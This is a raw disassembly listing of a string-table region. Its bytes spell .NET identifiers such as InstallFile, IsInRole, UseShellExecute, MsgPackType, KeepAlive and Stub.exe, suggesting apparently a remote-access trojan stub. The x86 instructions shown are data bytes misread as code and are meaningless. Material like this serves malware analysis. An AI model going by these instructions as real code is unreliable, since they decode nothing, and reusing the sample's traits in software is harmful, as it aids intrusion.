  407ae0:	64 6c                	fs insb (%dx),%es:(%edi)
  407ae2:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407ae6:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407aed:	65 
  407aee:	00 57 72             	add    %dl,0x72(%edi)
  407af1:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407af8:	6c 
  407af9:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407afe:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407b05:	65 74 41             	gs je  0x407b49
  407b08:	73 53                	jae    0x407b5d
  407b0a:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407b11:	6e                   	outsb  %ds:(%esi),(%dx)
  407b12:	73 74                	jae    0x407b88
  407b14:	61                   	popa
  407b15:	6c                   	insb   (%dx),%es:(%edi)
  407b16:	6c                   	insb   (%dx),%es:(%edi)
  407b17:	46                   	inc    %esi
  407b18:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407b1f:	6f 
  407b20:	64 65 46             	fs gs inc %esi
  407b23:	72 6f                	jb     0x407b94
  407b25:	6d                   	insl   (%dx),%es:(%edi)
  407b26:	46                   	inc    %esi
  407b27:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407b2e:	65 
  407b2f:	42                   	inc    %edx
  407b30:	79 74                	jns    0x407ba6
  407b32:	65 73 54             	gs jae 0x407b89
  407b35:	6f                   	outsl  %ds:(%esi),(%dx)
  407b36:	46                   	inc    %esi
  407b37:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407b3e:	6e 
  407b3f:	52                   	push   %edx
  407b40:	6f                   	outsl  %ds:(%esi),(%dx)
  407b41:	6c                   	insb   (%dx),%es:(%edi)
  407b42:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407b46:	6e                   	outsb  %ds:(%esi),(%dx)
  407b47:	64 6f                	outsl  %fs:(%esi),(%dx)
  407b49:	77 73                	ja     0x407bbe
  407b4b:	42                   	inc    %edx
  407b4c:	75 69                	jne    0x407bb7
  407b4e:	6c                   	insb   (%dx),%es:(%edi)
  407b4f:	74 49                	je     0x407b9a
  407b51:	6e                   	outsb  %ds:(%esi),(%dx)
  407b52:	52                   	push   %edx
  407b53:	6f                   	outsl  %ds:(%esi),(%dx)
  407b54:	6c                   	insb   (%dx),%es:(%edi)
  407b55:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407b59:	74 5f                	je     0x407bba
  407b5b:	4d                   	dec    %ebp
  407b5c:	61                   	popa
  407b5d:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407b64:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407b68:	6f                   	outsl  %ds:(%esi),(%dx)
  407b69:	63 65 73             	arpl   %esp,0x73(%ebp)
  407b6c:	73 4d                	jae    0x407bbb
  407b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6f:	64 75 6c             	fs jne 0x407bde
  407b72:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407b76:	74 5f                	je     0x407bd7
  407b78:	57                   	push   %edi
  407b79:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407b80:	79 6c                	jns    0x407bee
  407b82:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407b86:	6f                   	outsl  %ds:(%esi),(%dx)
  407b87:	63 65 73             	arpl   %esp,0x73(%ebp)
  407b8a:	73 57                	jae    0x407be3
  407b8c:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407b93:	79 6c                	jns    0x407c01
  407b95:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407b99:	74 5f                	je     0x407bfa
  407b9b:	46                   	inc    %esi
  407b9c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407ba3:	00 
  407ba4:	73 65                	jae    0x407c0b
  407ba6:	74 5f                	je     0x407c07
  407ba8:	46                   	inc    %esi
  407ba9:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bb0:	00 
  407bb1:	47                   	inc    %edi
  407bb2:	65 74 54             	gs je  0x407c09
  407bb5:	65 6d                	gs insl (%dx),%es:(%edi)
  407bb7:	70 46                	jo     0x407bff
  407bb9:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bc0:	00 
  407bc1:	47                   	inc    %edi
  407bc2:	65 74 46             	gs je  0x407c0b
  407bc5:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bcc:	00 
  407bcd:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407bd4:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407bd9:	6f                   	outsl  %ds:(%esi),(%dx)
  407bda:	64 75 6c             	fs jne 0x407c49
  407bdd:	65 4e                	gs dec %esi
  407bdf:	61                   	popa
  407be0:	6d                   	insl   (%dx),%es:(%edi)
  407be1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407be5:	74 5f                	je     0x407c46
  407be7:	4d                   	dec    %ebp
  407be8:	61                   	popa
  407be9:	63 68 69             	arpl   %ebp,0x69(%eax)
  407bec:	6e                   	outsb  %ds:(%esi),(%dx)
  407bed:	65 4e                	gs dec %esi
  407bef:	61                   	popa
  407bf0:	6d                   	insl   (%dx),%es:(%edi)
  407bf1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407bf5:	74 5f                	je     0x407c56
  407bf7:	4f                   	dec    %edi
  407bf8:	53                   	push   %ebx
  407bf9:	46                   	inc    %esi
  407bfa:	75 6c                	jne    0x407c68
  407bfc:	6c                   	insb   (%dx),%es:(%edi)
  407bfd:	4e                   	dec    %esi
  407bfe:	61                   	popa
  407bff:	6d                   	insl   (%dx),%es:(%edi)
  407c00:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c04:	74 5f                	je     0x407c65
  407c06:	46                   	inc    %esi
  407c07:	75 6c                	jne    0x407c75
  407c09:	6c                   	insb   (%dx),%es:(%edi)
  407c0a:	4e                   	dec    %esi
  407c0b:	61                   	popa
  407c0c:	6d                   	insl   (%dx),%es:(%edi)
  407c0d:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407c11:	56                   	push   %esi
  407c12:	61                   	popa
  407c13:	6c                   	insb   (%dx),%es:(%edi)
  407c14:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407c1b:	6e 
  407c1c:	4e                   	dec    %esi
  407c1d:	61                   	popa
  407c1e:	6d                   	insl   (%dx),%es:(%edi)
  407c1f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c23:	74 5f                	je     0x407c84
  407c25:	55                   	push   %ebp
  407c26:	73 65                	jae    0x407c8d
  407c28:	72 4e                	jb     0x407c78
  407c2a:	61                   	popa
  407c2b:	6d                   	insl   (%dx),%es:(%edi)
  407c2c:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407c31:	65 72 4e             	gs jb  0x407c82
  407c34:	61                   	popa
  407c35:	6d                   	insl   (%dx),%es:(%edi)
  407c36:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407c3a:	74 4e                	je     0x407c8a
  407c3c:	61                   	popa
  407c3d:	6d                   	insl   (%dx),%es:(%edi)
  407c3e:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407c42:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407c46:	6f                   	outsl  %ds:(%esi),(%dx)
  407c47:	73 74                	jae    0x407cbd
  407c49:	4e                   	dec    %esi
  407c4a:	61                   	popa
  407c4b:	6d                   	insl   (%dx),%es:(%edi)
  407c4c:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407c50:	6d                   	insl   (%dx),%es:(%edi)
  407c51:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407c56:	65 54                	gs push %esp
  407c58:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407c5f:	5f                   	pop    %edi
  407c60:	4c                   	dec    %esp
  407c61:	61                   	popa
  407c62:	73 74                	jae    0x407cd8
  407c64:	57                   	push   %edi
  407c65:	72 69                	jb     0x407cd0
  407c67:	74 65                	je     0x407cce
  407c69:	54                   	push   %esp
  407c6a:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407c71:	6e                   	outsb  %ds:(%esi),(%dx)
  407c72:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407c79:	54                   	push   %esp
  407c7a:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407c81:	43                   	inc    %ebx
  407c82:	6f                   	outsl  %ds:(%esi),(%dx)
  407c83:	6d                   	insl   (%dx),%es:(%edi)
  407c84:	6d                   	insl   (%dx),%es:(%edi)
  407c85:	61                   	popa
  407c86:	6e                   	outsb  %ds:(%esi),(%dx)
  407c87:	64 4c                	fs dec %esp
  407c89:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407c90:	74 65                	je     0x407cf7
  407c92:	4c                   	dec    %esp
  407c93:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407c9a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407c9d:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  407ca1:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  407ca8:	6d                   	insl   (%dx),%es:(%edi)
  407ca9:	65 54                	gs push %esp
  407cab:	79 70                	jns    0x407d1d
  407cad:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407cb1:	74 5f                	je     0x407d12
  407cb3:	56                   	push   %esi
  407cb4:	61                   	popa
  407cb5:	6c                   	insb   (%dx),%es:(%edi)
  407cb6:	75 65                	jne    0x407d1d
  407cb8:	54                   	push   %esp
  407cb9:	79 70                	jns    0x407d2b
  407cbb:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  407cbf:	6c                   	insb   (%dx),%es:(%edi)
  407cc0:	75 65                	jne    0x407d27
  407cc2:	54                   	push   %esp
  407cc3:	79 70                	jns    0x407d35
  407cc5:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  407cc9:	67 50                	addr16 push %eax
  407ccb:	61                   	popa
  407ccc:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  407ccf:	79 70                	jns    0x407d41
  407cd1:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407cd5:	6f                   	outsl  %ds:(%esi),(%dx)
  407cd6:	74 6f                	je     0x407d47
  407cd8:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407cdb:	54                   	push   %esp
  407cdc:	79 70                	jns    0x407d4e
  407cde:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ce2:	74 54                	je     0x407d38
  407ce4:	79 70                	jns    0x407d56
  407ce6:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  407cea:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407ced:	74 54                	je     0x407d43
  407cef:	79 70                	jns    0x407d61
  407cf1:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  407cf5:	6c                   	insb   (%dx),%es:(%edi)
  407cf6:	65 53                	gs push %ebx
  407cf8:	68 61 72 65 00       	push   $0x657261
  407cfd:	53                   	push   %ebx
  407cfe:	79 73                	jns    0x407d73
  407d00:	74 65                	je     0x407d67
  407d02:	6d                   	insl   (%dx),%es:(%edi)
  407d03:	2e 43                	cs inc %ebx
  407d05:	6f                   	outsl  %ds:(%esi),(%dx)
  407d06:	72 65                	jb     0x407d6d
  407d08:	00 53 65             	add    %dl,0x65(%ebx)
  407d0b:	72 76                	jb     0x407d83
  407d0d:	65 72 73             	gs jb  0x407d83
  407d10:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  407d17:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  407d1b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1c:	73 65                	jae    0x407d83
  407d1e:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  407d22:	70 6f                	jo     0x407d93
  407d24:	73 65                	jae    0x407d8b
  407d26:	00 50 61             	add    %dl,0x61(%eax)
  407d29:	72 73                	jb     0x407d9e
  407d2b:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  407d2f:	72 52                	jb     0x407d83
  407d31:	65 76 65             	gs jbe 0x407d99
  407d34:	72 73                	jb     0x407da9
  407d36:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  407d3a:	30 39                	xor    %bh,(%ecx)
  407d3c:	43                   	inc    %ebx
  407d3d:	65 72 74             	gs jb  0x407db4
  407d40:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d47:	00 56 61             	add    %dl,0x61(%esi)
  407d4a:	6c                   	insb   (%dx),%es:(%edi)
  407d4b:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  407d52:	72 
  407d53:	76 65                	jbe    0x407dba
  407d55:	72 43                	jb     0x407d9a
  407d57:	65 72 74             	gs jb  0x407dce
  407d5a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d61:	00 63 65             	add    %ah,0x65(%ebx)
  407d64:	72 74                	jb     0x407dda
  407d66:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d6d:	00 43 72             	add    %al,0x72(%ebx)
  407d70:	65 61                	gs popa
  407d72:	74 65                	je     0x407dd9
  407d74:	00 53 65             	add    %dl,0x65(%ebx)
  407d77:	74 54                	je     0x407dcd
  407d79:	68 72 65 61 64       	push   $0x64616572
  407d7e:	45                   	inc    %ebp
  407d7f:	78 65                	js     0x407de6
  407d81:	63 75 74             	arpl   %esi,0x74(%ebp)
  407d84:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  407d8b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d90:	65 74 65             	gs je  0x407df8
  407d93:	00 43 61             	add    %al,0x61(%ebx)
  407d96:	6c                   	insb   (%dx),%es:(%edi)
  407d97:	6c                   	insb   (%dx),%es:(%edi)
  407d98:	53                   	push   %ebx
  407d99:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  407da0:	74 
  407da1:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407da5:	6d                   	insl   (%dx),%es:(%edi)
  407da6:	70 69                	jo     0x407e11
  407da8:	6c                   	insb   (%dx),%es:(%edi)
  407da9:	65 72 47             	gs jb  0x407df3
  407dac:	65 6e                	outsb  %gs:(%esi),(%dx)
  407dae:	65 72 61             	gs jb  0x407e12
  407db1:	74 65                	je     0x407e18
  407db3:	64 41                	fs inc %ecx
  407db5:	74 74                	je     0x407e2b
  407db7:	72 69                	jb     0x407e22
  407db9:	62 75 74             	bound  %esi,0x74(%ebp)
  407dbc:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407dc1:	75 67                	jne    0x407e2a
  407dc3:	67 61                	addr16 popa
  407dc5:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  407dc9:	74 74                	je     0x407e3f
  407dcb:	72 69                	jb     0x407e36
  407dcd:	62 75 74             	bound  %esi,0x74(%ebp)
  407dd0:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407dd4:	6d                   	insl   (%dx),%es:(%edi)
  407dd5:	56                   	push   %esi
  407dd6:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407ddd:	74 74                	je     0x407e53
  407ddf:	72 69                	jb     0x407e4a
  407de1:	62 75 74             	bound  %esi,0x74(%ebp)
  407de4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407de8:	73 65                	jae    0x407e4f
  407dea:	6d                   	insl   (%dx),%es:(%edi)
  407deb:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407def:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407df6:	72 
  407df7:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407dfe:	73 73                	jae    0x407e73
  407e00:	65 6d                	gs insl (%dx),%es:(%edi)
  407e02:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407e06:	72 61                	jb     0x407e69
  407e08:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407e0b:	61                   	popa
  407e0c:	72 6b                	jb     0x407e79
  407e0e:	41                   	inc    %ecx
  407e0f:	74 74                	je     0x407e85
  407e11:	72 69                	jb     0x407e7c
  407e13:	62 75 74             	bound  %esi,0x74(%ebp)
  407e16:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  407e1b:	67 65 74 46          	addr16 gs je 0x407e65
  407e1f:	72 61                	jb     0x407e82
  407e21:	6d                   	insl   (%dx),%es:(%edi)
  407e22:	65 77 6f             	gs ja  0x407e94
  407e25:	72 6b                	jb     0x407e92
  407e27:	41                   	inc    %ecx
  407e28:	74 74                	je     0x407e9e
  407e2a:	72 69                	jb     0x407e95
  407e2c:	62 75 74             	bound  %esi,0x74(%ebp)
  407e2f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407e33:	73 65                	jae    0x407e9a
  407e35:	6d                   	insl   (%dx),%es:(%edi)
  407e36:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  407e3a:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  407e41:	69 
  407e42:	6f                   	outsl  %ds:(%esi),(%dx)
  407e43:	6e                   	outsb  %ds:(%esi),(%dx)
  407e44:	41                   	inc    %ecx
  407e45:	74 74                	je     0x407ebb
  407e47:	72 69                	jb     0x407eb2
  407e49:	62 75 74             	bound  %esi,0x74(%ebp)
  407e4c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407e50:	73 65                	jae    0x407eb7
  407e52:	6d                   	insl   (%dx),%es:(%edi)
  407e53:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407e57:	6f                   	outsl  %ds:(%esi),(%dx)
  407e58:	6e                   	outsb  %ds:(%esi),(%dx)
  407e59:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  407e5f:	74 69                	je     0x407eca
  407e61:	6f                   	outsl  %ds:(%esi),(%dx)
  407e62:	6e                   	outsb  %ds:(%esi),(%dx)
  407e63:	41                   	inc    %ecx
  407e64:	74 74                	je     0x407eda
  407e66:	72 69                	jb     0x407ed1
  407e68:	62 75 74             	bound  %esi,0x74(%ebp)
  407e6b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407e6f:	73 65                	jae    0x407ed6
  407e71:	6d                   	insl   (%dx),%es:(%edi)
  407e72:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407e76:	65 73 63             	gs jae 0x407edc
  407e79:	72 69                	jb     0x407ee4
  407e7b:	70 74                	jo     0x407ef1
  407e7d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407e84:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  407e8b:	65 66 61             	gs popaw
  407e8e:	75 6c                	jne    0x407efc
  407e90:	74 4d                	je     0x407edf
  407e92:	65 6d                	gs insl (%dx),%es:(%edi)
  407e94:	62 65 72             	bound  %esp,0x72(%ebp)
  407e97:	41                   	inc    %ecx
  407e98:	74 74                	je     0x407f0e
  407e9a:	72 69                	jb     0x407f05
  407e9c:	62 75 74             	bound  %esi,0x74(%ebp)
  407e9f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407ea3:	6d                   	insl   (%dx),%es:(%edi)
  407ea4:	70 69                	jo     0x407f0f
  407ea6:	6c                   	insb   (%dx),%es:(%edi)
  407ea7:	61                   	popa
  407ea8:	74 69                	je     0x407f13
  407eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  407eab:	6e                   	outsb  %ds:(%esi),(%dx)
  407eac:	52                   	push   %edx
  407ead:	65 6c                	gs insb (%dx),%es:(%edi)
  407eaf:	61                   	popa
  407eb0:	78 61                	js     0x407f13
  407eb2:	74 69                	je     0x407f1d
  407eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb6:	73 41                	jae    0x407ef9
  407eb8:	74 74                	je     0x407f2e
  407eba:	72 69                	jb     0x407f25
  407ebc:	62 75 74             	bound  %esi,0x74(%ebp)
  407ebf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ec3:	73 65                	jae    0x407f2a
  407ec5:	6d                   	insl   (%dx),%es:(%edi)
  407ec6:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407eca:	72 6f                	jb     0x407f3b
  407ecc:	64 75 63             	fs jne 0x407f32
  407ecf:	74 41                	je     0x407f12
  407ed1:	74 74                	je     0x407f47
  407ed3:	72 69                	jb     0x407f3e
  407ed5:	62 75 74             	bound  %esi,0x74(%ebp)
  407ed8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407edc:	73 65                	jae    0x407f43
  407ede:	6d                   	insl   (%dx),%es:(%edi)
  407edf:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee4:	70 79                	jo     0x407f5f
  407ee6:	72 69                	jb     0x407f51
  407ee8:	67 68 74 41 74 74    	addr16 push $0x74744174
  407eee:	72 69                	jb     0x407f59
  407ef0:	62 75 74             	bound  %esi,0x74(%ebp)
  407ef3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ef7:	73 65                	jae    0x407f5e
  407ef9:	6d                   	insl   (%dx),%es:(%edi)
  407efa:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407efe:	6f                   	outsl  %ds:(%esi),(%dx)
  407eff:	6d                   	insl   (%dx),%es:(%edi)
  407f00:	70 61                	jo     0x407f63
  407f02:	6e                   	outsb  %ds:(%esi),(%dx)
  407f03:	79 41                	jns    0x407f46
  407f05:	74 74                	je     0x407f7b
  407f07:	72 69                	jb     0x407f72
  407f09:	62 75 74             	bound  %esi,0x74(%ebp)
  407f0c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407f10:	6e                   	outsb  %ds:(%esi),(%dx)
  407f11:	74 69                	je     0x407f7c
  407f13:	6d                   	insl   (%dx),%es:(%edi)
  407f14:	65 43                	gs inc %ebx
  407f16:	6f                   	outsl  %ds:(%esi),(%dx)
  407f17:	6d                   	insl   (%dx),%es:(%edi)
  407f18:	70 61                	jo     0x407f7b
  407f1a:	74 69                	je     0x407f85
  407f1c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407f1f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407f26:	69 
  407f27:	62 75 74             	bound  %esi,0x74(%ebp)
  407f2a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407f2e:	74 5f                	je     0x407f8f
  407f30:	55                   	push   %ebp
  407f31:	73 65                	jae    0x407f98
  407f33:	53                   	push   %ebx
  407f34:	68 65 6c 6c 45       	push   $0x456c6c65
  407f39:	78 65                	js     0x407fa0
  407f3b:	63 75 74             	arpl   %esi,0x74(%ebp)
  407f3e:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407f42:	61                   	popa
  407f43:	64 42                	fs inc %edx
  407f45:	79 74                	jns    0x407fbb
  407f47:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  407f4b:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  407f52:	00 
  407f53:	44                   	inc    %esp
  407f54:	65 6c                	gs insb (%dx),%es:(%edi)
  407f56:	65 74 65             	gs je  0x407fbe
  407f59:	56                   	push   %esi
  407f5a:	61                   	popa
  407f5b:	6c                   	insb   (%dx),%es:(%edi)
  407f5c:	75 65                	jne    0x407fc3
  407f5e:	00 69 6e             	add    %ch,0x6e(%ecx)
  407f61:	6e                   	outsb  %ds:(%esi),(%dx)
  407f62:	65 72 56             	gs jb  0x407fbb
  407f65:	61                   	popa
  407f66:	6c                   	insb   (%dx),%es:(%edi)
  407f67:	75 65                	jne    0x407fce
  407f69:	00 47 65             	add    %al,0x65(%edi)
  407f6c:	74 56                	je     0x407fc4
  407f6e:	61                   	popa
  407f6f:	6c                   	insb   (%dx),%es:(%edi)
  407f70:	75 65                	jne    0x407fd7
  407f72:	00 53 65             	add    %dl,0x65(%ebx)
  407f75:	74 56                	je     0x407fcd
  407f77:	61                   	popa
  407f78:	6c                   	insb   (%dx),%es:(%edi)
  407f79:	75 65                	jne    0x407fe0
  407f7b:	00 76 61             	add    %dh,0x61(%esi)
  407f7e:	6c                   	insb   (%dx),%es:(%edi)
  407f7f:	75 65                	jne    0x407fe6
  407f81:	00 67 65             	add    %ah,0x65(%edi)
  407f84:	74 5f                	je     0x407fe5
  407f86:	4b                   	dec    %ebx
  407f87:	65 65 70 41          	gs gs jo 0x407fcc
  407f8b:	6c                   	insb   (%dx),%es:(%edi)
  407f8c:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  407f93:	5f                   	pop    %edi
  407f94:	4b                   	dec    %ebx
  407f95:	65 65 70 41          	gs gs jo 0x407fda
  407f99:	6c                   	insb   (%dx),%es:(%edi)
  407f9a:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  407fa1:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa2:	76 65                	jbe    0x408009
  407fa4:	00 53 74             	add    %dl,0x74(%ebx)
  407fa7:	75 62                	jne    0x40800b
  407fa9:	2e 65 78 65          	cs js,pn 0x408012
  407fad:	00 73 65             	add    %dh,0x65(%ebx)
  407fb0:	74 5f                	je     0x408011
  407fb2:	42                   	inc    %edx
  407fb3:	6c                   	insb   (%dx),%es:(%edi)
  407fb4:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb5:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  407fb8:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  407fbf:	5f                   	pop    %edi
  407fc0:	54                   	push   %esp
  407fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc2:	74 61                	je     0x408025
  407fc4:	6c                   	insb   (%dx),%es:(%edi)
  407fc5:	53                   	push   %ebx
  407fc6:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  407fcd:	5f                   	pop    %edi
  407fce:	48                   	dec    %eax
  407fcf:	65 61                	gs popa
  407fd1:	64 65 72 53          	fs gs jb 0x408028
  407fd5:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407fdc:	5f                   	pop    %edi
  407fdd:	48                   	dec    %eax
  407fde:	65 61                	gs popa
  407fe0:	64 65 72 53          	fs gs jb 0x408037
  407fe4:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407feb:	5f                   	pop    %edi
  407fec:	53                   	push   %ebx
  407fed:	65 6e                	outsb  %gs:(%esi),(%dx)
  407fef:	64 42                	fs inc %edx
  407ff1:	75 66                	jne    0x408059
  407ff3:	66 65 72 53          	data16 gs jb 0x40804a
  407ff7:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407ffe:	5f                   	pop    %edi
  407fff:	52                   	push   %edx
  408000:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408004:	76 65                	jbe    0x40806b
  408006:	42                   	inc    %edx
  408007:	75 66                	jne    0x40806f
  408009:	66 65 72 53          	data16 gs jb 0x408060
  40800d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408014:	5f                   	pop    %edi
  408015:	4b                   	dec    %ebx
  408016:	65 79 53             	gs jns 0x40806c
  408019:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408020:	65 78 4f             	gs js  0x408072
  408023:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408027:	72 46                	jb     0x40806f
  408029:	6c                   	insb   (%dx),%es:(%edi)
  40802a:	61                   	popa
  40802b:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40802f:	79 70                	jns    0x4080a1
  408031:	74 6f                	je     0x4080a2
  408033:	43                   	inc    %ebx
  408034:	6f                   	outsl  %ds:(%esi),(%dx)
  408035:	6e                   	outsb  %ds:(%esi),(%dx)
  408036:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  40803c:	74 5f                	je     0x40809d
  40803e:	50                   	push   %eax
  40803f:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408046:	5f                   	pop    %edi
  408047:	50                   	push   %eax
  408048:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40804f:	74 65                	je     0x4080b6
  408051:	6d                   	insl   (%dx),%es:(%edi)
  408052:	2e 54                	cs push %esp
  408054:	68 72 65 61 64       	push   $0x64616572
